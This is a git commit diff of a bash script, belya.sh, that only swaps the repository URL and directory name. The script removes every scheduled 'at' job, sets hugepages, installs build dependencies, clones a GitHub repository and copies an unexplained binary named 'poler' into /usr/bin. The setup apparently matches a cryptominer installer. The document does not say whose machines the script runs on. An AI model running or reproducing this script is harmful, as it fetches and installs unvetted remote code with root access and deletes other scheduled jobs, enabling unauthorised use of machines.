81b99d169d382b1305021603ea2a65a653704a97
today100not <56802907+today100not@users.noreply.github.com>
2019-10-20 16:15:54 -0400

    Update belya.sh

--- belya.sh
+++ belya.sh
@@ -1,18 +1,18 @@
 #!/bin/bash
 
-rm -rf /tmp/ekonomka/
+rm -rf /tmp/one/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir ekonomka
-git clone https://github.com/robbertopp1/ekonomka.git /tmp/ekonomka
-cd /tmp/ekonomka
-chmod +x /tmp/ekonomka/poler
+cd /tmp && mkdir one
+git clone https://github.com/today100not/one.git /tmp/one
+cd /tmp/one
+chmod +x /tmp/one/poler
 chmod 777 ./*.sh
-cp /tmp/ekonomka/poler /usr/bin/
+cp /tmp/one/poler /usr/bin/
 sleep 3
 
 sudo apt-get install dos2unix
